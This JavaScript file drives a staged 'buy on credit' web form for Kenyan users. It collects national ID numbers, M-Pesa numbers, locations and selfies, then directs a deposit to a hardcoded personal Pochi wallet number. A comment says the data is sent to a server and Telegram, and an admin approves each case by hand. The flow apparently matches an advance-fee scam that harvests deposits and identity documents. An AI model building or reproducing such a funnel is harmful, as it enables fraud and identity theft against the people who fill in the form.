document.addEventListener('DOMContentLoaded', () => {
    const formData = { 
        product: { model: '', category: '', price: 0 }, 
        idNumber: '', 
        mpesaNumber: '', 
        mpesaNumberConfirm: '', 
        location: '', 
        selfieDataUrl: '', 
        walletNumber: '', 
        amount: 0 
    };
    let currentAppId = null;
    let pollInterval = null;

    const validKenyanLocations = [
        'nairobi', 'westlands', 'kilimani', 'karen', 'kasarani', 'embakasi', 'kibera', 'dagoretti', 'kamukunji', 'starehe',
        'mombasa', 'nyali', 'likoni', 'changamwe', 'kisauni', 'mvita',
        'kisumu', 'nakuru', 'eldoret', 'thika', 'ruiru', 'kiambu', 'machakos', 'kitengela', 'ngong', 'ongata rongai',
        'naivasha', 'nyeri', 'meru', 'embu', 'kericho', 'kakamega', 'bungoma', 'kitale', 'malindi', 'diani', 'kilifi',
        'makueni', 'kajiado', 'narok', 'bomet', 'kisii', 'homabay', 'migori', 'siaya', 'busia', 'vihiga',
        'nanyuki', 'karatina', 'limuru', 'juja', 'kikuyu', 'athiriver', 'voi', 'garissa', 'isiolo', 'lamu'
    ];

    function goToStage(stageNumber) {
        document.querySelectorAll('.form-stage').forEach(stage => stage.classList.remove('active'));
        document.getElementById(`stage-${stageNumber}`).classList.add('active');

        for (let i = 1; i <= 5; i++) {
            const indicator = document.getElementById(`step-indicator-${i}`);
            if (indicator) {
                if (i < stageNumber) { indicator.classList.add('completed'); indicator.classList.remove('active'); } 
                else if (i === stageNumber) { indicator.classList.add('active'); indicator.classList.remove('completed'); } 
                else { indicator.classList.remove('active', 'completed'); }
            }
        }
    }

    // Stage 1: Auto-advance on model selection
    document.querySelectorAll('input[name="product"]').forEach(radio => {
        radio.addEventListener('change', (e) => {
            formData.product.model = e.target.value;
            formData.product.category = e.target.dataset.category;
            formData.amount = e.target.dataset.price;
            
            document.getElementById('depositAmount').value = formData.amount;
            document.getElementById('selected-model-title').textContent = formData.product.model;
            document.getElementById('success-model-name').textContent = formData.product.model;
            setTimeout(() => goToStage(2), 300);
        });
    });

    // Stage 2: Details & Location Validation
    const phoneError = document.getElementById('phone-match-error');
    let locError = document.getElementById('location-error');
    if (!locError) {
        locError = document.createElement('small');
        locError.id = 'location-error';
        locError.style.color = '#dc2626';
        locError.style.display = 'none';
        locError.textContent = '⚠️ Please enter a recognizable Kenyan town or county (e.g. Westlands, Nairobi, Nakuru).';
        document.getElementById('location').parentNode.appendChild(locError);
    }

    function isRecognizableLocation(locText) {
        const cleanLoc = locText.toLowerCase().trim();
        return validKenyanLocations.some(town => cleanLoc.includes(town));
    }

    function checkStage2Validity() {
        const id = document.getElementById('idNumber').value.trim();
        const p1 = document.getElementById('mpesaNumber').value.trim();
        const p2 = document.getElementById('mpesaNumberConfirm').value.trim();
        const loc = document.getElementById('location').value.trim();

        if (p1.length >= 10 && p2.length >= 10) {
            phoneError.style.display = (p1 !== p2) ? 'block' : 'none';
        } else {
            phoneError.style.display = 'none';
        }

        if (loc.length >= 3) {
            locError.style.display = isRecognizableLocation(loc) ? 'none' : 'block';
        } else {
            locError.style.display = 'none';
        }

        const isIdValid = /^[0-9]{6,9}$/.test(id);
        const isPhoneValid = /^(07|01)[0-9]{8}$/.test(p1) && p1 === p2;
        const isLocValid = loc.length >= 3 && isRecognizableLocation(loc);

        if (isIdValid && isPhoneValid && isLocValid) {
            formData.idNumber = id; 
            formData.mpesaNumber = p1; 
            formData.mpesaNumberConfirm = p2; 
            formData.location = loc;
            document.getElementById('walletNumber').value = p1;
            setTimeout(() => goToStage(3), 400);
        }
    }

    ['idNumber', 'mpesaNumber', 'mpesaNumberConfirm', 'location'].forEach(id => {
        document.getElementById(id).addEventListener('input', checkStage2Validity);
    });

    // Stage 3: Selfie Verification Upload
    const selfieInput = document.getElementById('selfiePhoto');
    const selfiePreview = document.getElementById('selfie-preview');
    const selfiePreviewBox = document.getElementById('selfie-preview-container');
    const selfieError = document.getElementById('selfie-error');

    selfieInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(evt) {
                formData.selfieDataUrl = evt.target.result;
                selfiePreview.src = evt.target.result;
                selfiePreviewBox.style.display = 'block';
                selfieError.style.display = 'none';
                
                setTimeout(() => goToStage(4), 500);
            };
            reader.readAsDataURL(file);
        } else {
            selfieError.style.display = 'block';
        }
    });

    // Stage 4: Copy Pochi Number Button
    document.getElementById('copy-pochi-btn').addEventListener('click', () => {
        const pochiNum = document.getElementById('pochi-number').innerText.trim();
        navigator.clipboard.writeText(pochiNum).then(() => {
            const statusMsg = document.getElementById('copy-status-msg');
            statusMsg.textContent = '✓ Number copied to clipboard!';
            setTimeout(() => { statusMsg.textContent = ''; }, 3500);
        }).catch(() => {
            alert('Failed to copy. Please manually note 0757648339.');
        });
    });

    // Stage 4 Submit: Trigger 10s Timer & Send to Server / Telegram
    document.getElementById('i-have-paid-btn').addEventListener('click', () => {
        const wallet = document.getElementById('walletNumber').value.trim();
        if (!/^(07|01)[0-9]{8}$/.test(wallet)) {
            alert('Please enter a valid M-Pesa wallet phone number.');
            return;
        }
        if (!formData.selfieDataUrl) {
            alert('Please upload a selfie photo before proceeding.');
            goToStage(3);
            return;
        }

        formData.walletNumber = wallet;
        goToStage(5);
        
        let secondsLeft = 10;
        const timerDisplay = document.getElementById('countdown-timer');
        timerDisplay.textContent = secondsLeft;

        const countdownInterval = setInterval(async () => {
            secondsLeft--;
            timerDisplay.textContent = secondsLeft;

            if (secondsLeft <= 0) {
                clearInterval(countdownInterval);
                document.getElementById('countdown-card').style.display = 'none';
                document.getElementById('verification-card').style.display = 'block';
                
                try {
                    const response = await fetch('/api/process-credit-app', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(formData)
                    });
                    const data = await response.json();
                    if (data.success) {
                        currentAppId = data.appId;
                        startPollingForAdminApproval();
                    } else {
                        alert(data.message || 'Error processing request');
                        goToStage(4);
                    }
                } catch (err) {
                    console.error('Submission error:', err);
                    goToStage(4);
                }
            }
        }, 1000);
    });

    // Stage 5: Poll status from admin responses
    function startPollingForAdminApproval() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            if (!currentAppId) return;
            try {
                const res = await fetch(`/api/check-status/${currentAppId}`);
                const data = await res.json();

                if (data.photoUrl) {
                    const photoBox = document.getElementById('admin-photo-container');
                    const photoImg = document.getElementById('item-live-photo');
                    if (photoImg.src !== data.photoUrl) {
                        photoImg.src = data.photoUrl;
                        photoBox.style.display = 'block';
                    }
                }

                if (data.status === 'APPROVED') {
                    clearInterval(pollInterval);
                    goToStage(6);
                } else if (data.status === 'REJECTED') {
                    clearInterval(pollInterval);
                    alert('❌ Payment was not detected or was rejected by admin. Please try again.');
                    document.getElementById('countdown-card').style.display = 'block';
                    document.getElementById('verification-card').style.display = 'none';
                    goToStage(4);
                }
            } catch (err) { console.error('Polling error', err); }
        }, 2000);
    }
});
